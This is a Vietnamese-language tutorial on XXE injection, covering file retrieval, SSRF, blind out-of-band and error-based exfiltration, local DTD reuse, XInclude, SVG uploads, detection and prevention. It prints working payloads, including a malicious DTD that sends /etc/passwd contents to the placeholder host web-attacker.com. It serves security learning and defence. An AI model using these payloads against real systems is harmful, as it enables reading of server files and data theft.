# 🛡️ XML External Entity (XXE) Injection

---

## 📌 XML external entity injection là gì?
- **XML external entity injection (XXE)** là một lỗ hổng bảo mật web cho phép kẻ tấn công can thiệp vào quá trình xử lý dữ liệu XML của ứng dụng.  
- Nó thường cho phép kẻ tấn công **xem các tệp trên hệ thống máy chủ** và **tương tác với các hệ thống phụ trợ hoặc bên ngoài** mà ứng dụng có thể truy cập.  
- Trong một số tình huống, kẻ tấn công có thể **leo thang tấn công XXE để xâm phạm máy chủ hoặc hạ tầng phụ trợ**, bằng cách lợi dụng XXE để thực hiện các cuộc tấn công **SSRF (Server-Side Request Forgery)**.

---

## ⚙️ Lỗ hổng XXE phát sinh như thế nào?
- Một số ứng dụng sử dụng định dạng XML để truyền dữ liệu giữa trình duyệt và máy chủ, thường thông qua thư viện hoặc API tiêu chuẩn.  
- Lỗ hổng XXE xuất hiện vì đặc tả XML chứa nhiều tính năng tiềm ẩn nguy hiểm, và các parser XML mặc định vẫn hỗ trợ các tính năng này dù ứng dụng không cần đến.  
- **External entities** trong XML là các thực thể tùy chỉnh, có giá trị được tải từ bên ngoài DTD. Chúng đặc biệt nguy hiểm vì có thể tham chiếu đến **đường dẫn tệp hoặc URL**.

---

## ⚔️ Các loại tấn công XXE

---

### 📁 Khai thác XXE để lấy file

**Mục tiêu:** Đọc tệp tùy ý từ hệ thống tệp của máy chủ.

**Cách thực hiện:**
1. Thêm (hoặc chỉnh sửa) phần `<!DOCTYPE>` để khai báo một external entity trỏ tới tệp cần đọc (vd: `/etc/passwd`).
2. Chèn thực thể này vào một giá trị dữ liệu trong XML — phần này phải được phản hồi lại bởi ứng dụng.

**Ví dụ:**

```xml
<?xml version="1.0" encoding="UTF-8"?>
<stockCheck><productId>381</productId></stockCheck>
```

**Payload khai thác:**

```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [ <!ENTITY xxe SYSTEM "file:///etc/passwd"> ]>
<stockCheck><productId>&xxe;</productId></stockCheck>
```

**Giải thích:**
- `<!ENTITY xxe SYSTEM "file:///etc/passwd">` định nghĩa một external entity tên `xxe` chứa nội dung tệp `/etc/passwd`.
- `&xxe;` được chèn vào trong `<productId>` để gọi thực thể đó.

---

### 🌐 Khai thác XXE để thực hiện SSRF

**Mục tiêu:** Ép máy chủ gửi HTTP request đến các URL nội bộ hoặc bên ngoài.

**Cách thực hiện:**
1. Định nghĩa một external entity trong `DOCTYPE` trỏ tới URL mục tiêu.
2. Chèn thực thể đó vào giá trị dữ liệu trong XML.

- Nếu giá trị đó **xuất hiện trong phản hồi**, kẻ tấn công có thể **xem phản hồi từ hệ thống nội bộ** → tương tác hai chiều.
- Nếu **không xuất hiện**, vẫn có thể thực hiện **blind SSRF** → quét mạng nội bộ hoặc truy cập dịch vụ nhạy cảm.

**Ví dụ:**

```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [ <!ENTITY xxe SYSTEM "http://internal.vulnerable-website.com/"> ]>
<stockCheck><productId>&xxe;</productId></stockCheck>
```

**Giải thích:**
- `<!ENTITY xxe SYSTEM "http://internal.vulnerable-website.com/">` tạo một external entity trỏ tới địa chỉ nội bộ.
- Khi xử lý, máy chủ sẽ gửi HTTP request đến URL này thay cho người dùng.

---

### 👁️ Blind XXE vulnerabilities

- Blind XXE xảy ra khi ứng dụng **không trả về giá trị của external entity** trong phản hồi.  
- Không thể trực tiếp đọc file như XXE thường, nhưng vẫn có thể khai thác với kỹ thuật nâng cao:

**Cách khai thác:**
- Sử dụng **out-of-band (OOB)**: khiến máy chủ gửi dữ liệu ra hệ thống do kẻ tấn công kiểm soát để rò rỉ dữ liệu.
- Cố ý **gây lỗi XML parsing** để lộ thông tin nhạy cảm trong thông báo lỗi. 

---

### 🕵️ Phát hiện blind XXE bằng OOB (Out-Of-Band)

- Bạn thường có thể **phát hiện blind XXE** bằng cách sử dụng **cùng kỹ thuật như các cuộc tấn công XXE SSRF** nhưng **kích hoạt tương tác mạng ngoài băng (OOB)** tới một hệ thống do bạn kiểm soát. Ví dụ, bạn sẽ định nghĩa một **external entity** như sau:

```xml
<!DOCTYPE foo [ <!ENTITY xxe SYSTEM "http://f2g9j7hhkax.web-attacker.com"> ]>
```

- Cuộc tấn công XXE này khiến **máy chủ thực hiện một yêu cầu HTTP từ phía back-end tới URL đã chỉ định.**
Kẻ tấn công có thể **giám sát truy vấn DNS và yêu cầu HTTP** kết quả, và từ đó phát hiện rằng **cuộc tấn công XXE đã thành công.**

---

### ⚡ Phát hiện blind XXE bằng XML parameter entities

Đôi khi, **các cuộc tấn công XXE sử dụng regular entities bị chặn** do ứng dụng có kiểm tra đầu vào hoặc do parser XML đã được cấu hình an toàn hơn.  
Trong trường hợp này, bạn có thể thử dùng **XML parameter entities** thay thế.

### 📌 XML parameter entities là gì?

- Là một loại entity đặc biệt trong XML, **chỉ có thể được tham chiếu bên trong DTD**.
- Khác với regular entity:
  - Khi **khai báo**, tên entity có dấu **`%`** phía trước:

    ```xml
    <!ENTITY % myparameterentity "my parameter entity value" >
    ```

  - Khi **sử dụng**, cũng gọi bằng **`%`** thay vì `&`:

    ```xml
    %myparameterentity;
    ```


#### 📌 Ví dụ payload kiểm tra blind XXE (OOB)

```xml
<!DOCTYPE foo [
  <!ENTITY % xxe SYSTEM "http://f2g9j7hhkax.web-attacker.com">
  %xxe;
]>
```

---

### ⚡ Exploiting blind XXE to exfiltrate data out-of-band

Việc phát hiện lỗ hổng **blind XXE** bằng kỹ thuật **ngoài băng (out-of-band)** là rất hữu ích, nhưng nó không thật sự chứng minh cách lỗ hổng này có thể bị khai thác.  
Điều mà kẻ tấn công thực sự muốn là **trích xuất dữ liệu nhạy cảm**.  

Điều này có thể thực hiện thông qua blind XXE bằng cách:
- Kẻ tấn công **lưu trữ một tệp DTD độc hại** trên hệ thống do họ kiểm soát
- Sau đó **gọi đến DTD bên ngoài đó từ trong payload XXE**

#### 📌 Ví dụ DTD độc hại để trích xuất nội dung `/etc/passwd`

```xml
<!ENTITY % file SYSTEM "file:///etc/passwd">
<!ENTITY % eval "<!ENTITY &#x25; exfiltrate SYSTEM 'http://web-attacker.com/?x=%file;'>">
%eval;
%exfiltrate;
```
#### 📌 Các bước mà DTD độc hại thực hiện

- Định nghĩa một **XML parameter entity** tên `file`, chứa nội dung của tệp `/etc/passwd`.  
- Định nghĩa một **XML parameter entity** tên `eval`, chứa một khai báo động của một **XML parameter entity** khác tên `exfiltrate`.  
  - Thực thể `exfiltrate` sẽ được thực thi bằng cách gửi một **yêu cầu HTTP tới máy chủ web của kẻ tấn công**, kèm giá trị của thực thể `file` trong **URL query string**.  
- Gọi thực thể `eval`, hành động này sẽ **tạo động thực thể `exfiltrate`**.  
- Gọi thực thể `exfiltrate`, để thực thể này được **thực thi bằng cách gửi yêu cầu HTTP tới URL đã chỉ định**.

Sau đó, kẻ tấn công phải lưu trữ DTD độc hại trên hệ thống do chúng kiểm soát, thường bằng cách tải nó lên máy chủ web của chúng. Ví dụ: kẻ tấn công có thể gửi DTD độc hại đến URL sau:
```http://web-attacker.com/malicious.dtd```

Cuối cùng, kẻ tấn công phải gửi đoạn mã XXE sau tới ứng dụng dễ bị tấn công:

```xml
<!DOCTYPE foo [<!ENTITY % xxe SYSTEM
"http://web-attacker.com/malicious.dtd"> %xxe;]>
```
**Giải thích**
- Payload này định nghĩa xxe trỏ tới `malicious.dtd.`
- Parser sẽ tải DTD bên ngoài và thực thi inline.
- Các bước trong `malicious.dtd` chạy và gửi nội dung `/etc/passwd` tới máy chủ của attacker.

Tải trọng XXE này khai báo một thực thể tham số XML có tên là xxe và sau đó sử dụng thực thể này trong DTD. Điều này sẽ khiến trình phân tích cú pháp XML lấy DTD bên ngoài từ máy chủ của kẻ tấn công và diễn giải nó nội tuyến. Các bước được xác định trong DTD độc hại sau đó được thực thi và tệp /etc/passwd được truyền đến máy chủ của kẻ tấn công.

---

### ⚡ Khai thác blind XXE để lấy dữ liệu thông qua thông báo lỗi
- Cách khác để khai thác **blind XXE** là **gây lỗi XML parser** để **thông báo lỗi chứa dữ liệu nhạy cảm** (vd: `/etc/passwd`).  
- Hiệu quả nếu **ứng dụng trả về lỗi parser trong phản hồi**.

Bạn có thể **gây lỗi XML parser** để **thông báo lỗi chứa nội dung `/etc/passwd`** bằng một **DTD độc hại** như sau:

```xml
<!ENTITY % file SYSTEM "file:///etc/passwd">
<!ENTITY % eval "<!ENTITY &#x25; error SYSTEM 'file:///nonexistent/%file;'>">
%eval;
%error;
```

#### 📌 Cách hoạt động

- Định nghĩa `file` đọc nội dung của `/etc/passwd`.  
- Định nghĩa `eval` chứa một khai báo động cho entity `error`.  
- `error` sẽ cố tải một tệp **không tồn tại** có tên chứa giá trị của `file`.  
- Gọi `%eval;` để tạo entity `error`.  
- Gọi `%error;` để parser cố tải tệp không tồn tại → **gây lỗi**.  
- **Thông báo lỗi** sẽ chứa **tên tệp không tồn tại**, chính là **nội dung `/etc/passwd`**.

#### 📌 Ví dụ lỗi nhận được

```xml
java.io.FileNotFoundException: /nonexistent/root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
bin:x:2:2:bin:/bin:/usr/sbin/nologin
...
```

---

### ⚡ Khai thác blind XXE bằng cách tái sử dụng local DTD

Kỹ thuật gây lỗi parser để lấy dữ liệu thường hoạt động với **external DTD**, nhưng **không hoạt động với internal DTD** nằm hoàn toàn trong phần `<!DOCTYPE>`.  
Lý do: **XML chuẩn không cho phép dùng parameter entity bên trong định nghĩa của một parameter entity khác trong internal DTD**, nhưng **cho phép trong external DTD** (một số parser có thể bỏ qua, nhưng đa số không).

---

#### 📌 Ý tưởng vượt giới hạn này

- Nếu **các kết nối OOB bị chặn** (không thể gửi request ra ngoài, không thể tải DTD từ xa), vẫn có thể:
  - Gây lỗi parser chứa dữ liệu nhạy cảm
  - Bằng cách **dùng DTD lai (hybrid DTD)**: vừa có **external DTD cục bộ** vừa có **internal DTD**
- Khi dùng hybrid DTD:
  - Internal DTD có thể **ghi đè entity đã khai báo trong external DTD**
  - Khi ghi đè, **giới hạn về việc lồng parameter entity được nới lỏng** <br>
  → Tận dụng một **tệp DTD có sẵn trên máy chủ** làm external DTD, rồi **ghi đè entity bên trong nó để gây lỗi chứa dữ liệu nhạy cảm**.
  
<br>

> 📌 Kỹ thuật này do **Arseniy Sharoglazov** phát triển, từng xếp hạng #7 trong **top 10 web hacking techniques of 2018**.
<br>

#### 📌 Ví dụ hybrid DTD

Giả sử máy chủ có một tệp DTD tại `/usr/local/app/schema.dtd`  
và tệp này có khai báo entity tên `custom_entity`.

Kẻ tấn công gửi payload:

```xml
<!DOCTYPE foo [
  <!ENTITY % local_dtd SYSTEM "file:///usr/local/app/schema.dtd">
  <!ENTITY % custom_entity '
    <!ENTITY &#x25; file SYSTEM "file:///etc/passwd">
    <!ENTITY &#x25; eval "<!ENTITY &#x26;#x25; error SYSTEM &#x27;file:///nonexistent/&#x25;file;&#x27;>">
    &#x25;eval;
    &#x25;error;
  '>
  %local_dtd;
]>
```

#### 📌 Các bước DTD này thực hiện

- Định nghĩa một **XML parameter entity** tên `local_dtd`, chứa nội dung của **tệp DTD bên ngoài có sẵn trên hệ thống máy chủ**.  
- **Ghi đè entity `custom_entity`** (vốn đã được định nghĩa trong tệp DTD bên ngoài) bằng **payload XXE kiểu gây lỗi**, để tạo **thông báo lỗi chứa nội dung `/etc/passwd`**.  
- Gọi entity `%local_dtd;` để **parser tải và xử lý DTD bên ngoài**, bao gồm **phiên bản mới đã bị ghi đè của `custom_entity`**, dẫn đến **thông báo lỗi mong muốn**.

### 📌 Xác định một tệp DTD có sẵn để tái sử dụng

Vì kiểu tấn công XXE này cần **tái sử dụng một tệp DTD có sẵn trên hệ thống máy chủ**, nên bước quan trọng đầu tiên là **xác định được tệp DTD phù hợp**.  

Điều này thực ra khá đơn giản:  
- Nếu ứng dụng **trả về thông báo lỗi từ XML parser**, bạn có thể **liệt kê (enumerate) các tệp DTD cục bộ** bằng cách thử tải chúng từ internal DTD.
- Nếu tệp tồn tại → parser đọc thành công  
- Nếu không tồn tại → parser trả lỗi → bạn biết là không có tệp đó.


#### 📌 Ví dụ kiểm tra tệp DTD phổ biến

- Trên hệ thống Linux dùng GNOME thường có tệp: `/usr/share/yelp/dtd/docbookx.dtd`. 
- Bạn có thể kiểm tra xem tệp này có tồn tại hay không bằng cách gửi tải trọng XXE sau, điều này sẽ gây ra lỗi nếu tệp bị thiếu:

```xml
<!DOCTYPE foo [
<!ENTITY % local_dtd SYSTEM "file:///usr/share/yelp/dtd/docbookx.dtd">
%local_dtd;
]>
```
- Khi đã **thử và tìm được một tệp DTD có sẵn trên hệ thống máy chủ**, bước tiếp theo là:  
  - **Tải một bản sao của tệp DTD đó về**  
  - **Xem xét nội dung để tìm một entity có thể bị ghi đè**

- Vì nhiều hệ thống phổ biến có chứa DTD là **mã nguồn mở**, bạn thường có thể **nhanh chóng tìm và tải các tệp này trên Internet** để phục vụ quá trình phân tích.

---

### 🔍 Tìm kiếm bề mặt tấn công ẩn cho XXE

- Thông thường, bề mặt tấn công XXE khá rõ ràng vì xuất hiện trong các request chứa dữ liệu XML.
- Tuy nhiên, đôi khi dữ liệu người dùng **được nhúng vào XML phía máy chủ trước khi xử lý**, khiến bề mặt tấn công **ẩn đi và khó nhận thấy**.


#### 📦 XInclude attacks

- Một số ứng dụng nhận dữ liệu người dùng, nhúng vào tài liệu XML phía máy chủ rồi mới parse.
- Trong tình huống này không thể dùng XXE cổ điển (không thêm `DOCTYPE` được), nhưng có thể dùng **XInclude**.

**XInclude** là một phần của XML cho phép chèn nội dung từ tài liệu con vào tài liệu chính → có thể chèn payload vào bất kỳ trường dữ liệu nào.

**Ví dụ:**
```xml
<foo xmlns:xi="http://www.w3.org/2001/XInclude">
  <xi:include parse="text" href="file:///etc/passwd"/>
</foo>
```

**Giải thích:**
- `xmlns:xi` khai báo namespace XInclude.
- `xi:include` sẽ yêu cầu parser chèn nội dung tệp `/etc/passwd` vào tài liệu XML.

---

### 📤 Tấn công XXE qua file upload

- Một số định dạng file phổ biến **dựa trên XML hoặc chứa XML con**, ví dụ:
  - DOCX (tài liệu Office)
  - SVG (hình ảnh vector)

- Nếu ứng dụng cho phép tải file và xử lý server-side, kẻ tấn công có thể:
  - Gửi **tệp SVG độc hại** (dù ứng dụng chỉ mong đợi PNG/JPEG)
  - Khai thác **bề mặt tấn công ẩn** của XXE thông qua quá trình xử lý file tải lên

**Ví dụ:**
```xml
<?xml version="1.0" standalone="yes"?><!DOCTYPE test [ <!ENTITY xxe SYSTEM "file:///etc/hostname" > ]><svg width="128px" height="128px" xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink" version="1.1"><text font-size="16" x="0" y="16">&xxe;</text></svg>
```

### ⚡ XXE attacks via modified Content-Type

- Một số yêu cầu **POST** mặc định sử dụng `Content-Type: application/x-www-form-urlencoded` — đây là kiểu được HTML form sinh ra.  
- Nhiều trang web mong đợi nhận dữ liệu ở định dạng này, nhưng một số vẫn **chấp nhận các loại content type khác, như XML**.

📌 Điều này mở ra **bề mặt tấn công XXE ẩn**:  
Nếu ứng dụng **chấp nhận nội dung XML** và **phân tích (parse) nội dung body như XML**, thì chỉ cần **gửi lại request ở định dạng XML** là có thể khai thác được.

#### 📝 Request bình thường:

```
POST /action HTTP/1.0
Content-Type: application/x-www-form-urlencoded
Content-Length: 7

foo=bar
```

#### 🧪 Request thử bằng XML:
```
POST /action HTTP/1.0
Content-Type: text/xml
Content-Length: 52

<?xml version="1.0" encoding="UTF-8"?><foo>bar</foo>
```

- Nếu ứng dụng chấp nhận các yêu cầu có nội dung XML trong phần body và **phân tích nội dung body đó như XML**,  
  → bạn đã **tiếp cận được bề mặt tấn công XXE ẩn** chỉ bằng cách **gửi lại các request dưới định dạng XML**.

## 🕵️ Cách tìm và kiểm tra lỗ hổng XXE

Phần lớn các lỗ hổng **XXE** có thể được phát hiện nhanh chóng và đáng tin cậy bằng **Burp Suite Web Vulnerability Scanner**.

### 📌 Kiểm tra thủ công lỗ hổng XXE

- **Kiểm tra đọc file cục bộ:**  
  - Định nghĩa một **external entity** trỏ đến **tệp hệ điều hành phổ biến** (vd: `/etc/passwd`)  
  - Sử dụng entity này trong dữ liệu sẽ được phản hồi lại → nếu thấy nội dung tệp → có lỗ hổng XXE

- **Kiểm tra blind XXE:**  
  - Định nghĩa một **external entity** trỏ tới **URL thuộc hệ thống bạn kiểm soát**  
  - Dùng công cụ như **Burp Collaborator** để **giám sát request/DNS lookup** từ máy chủ → nếu có tương tác → có lỗ hổng blind XXE

- **Kiểm tra chèn dữ liệu không phải XML vào XML phía máy chủ (XInclude):**  
  - Dùng **payload XInclude** để thử đọc một tệp hệ điều hành phổ biến  
  - Nếu thành công → có lỗ hổng XXE do dữ liệu người dùng bị chèn vào XML server-side


## 🛡️ Cách phòng chống lỗ hổng XXE

Hầu hết các lỗ hổng **XXE** xảy ra do **thư viện phân tích XML của ứng dụng hỗ trợ các tính năng nguy hiểm mà ứng dụng không cần hoặc không dự định sử dụng**.  

📌 Cách đơn giản và hiệu quả nhất để ngăn chặn XXE là **vô hiệu hóa các tính năng này**.


### 📌 Các biện pháp chính

- **Vô hiệu hóa việc xử lý external entities**  
  → Ngăn parser tự động tải dữ liệu từ tệp hoặc URL bên ngoài.

- **Vô hiệu hóa hỗ trợ XInclude**  
  → Ngăn parser chèn tài liệu con vào XML.

<br>

💡 Thông thường, bạn có thể thực hiện điều này bằng:
- Các **tùy chọn cấu hình** của thư viện XML  
- Hoặc **ghi đè hành vi mặc định bằng code**


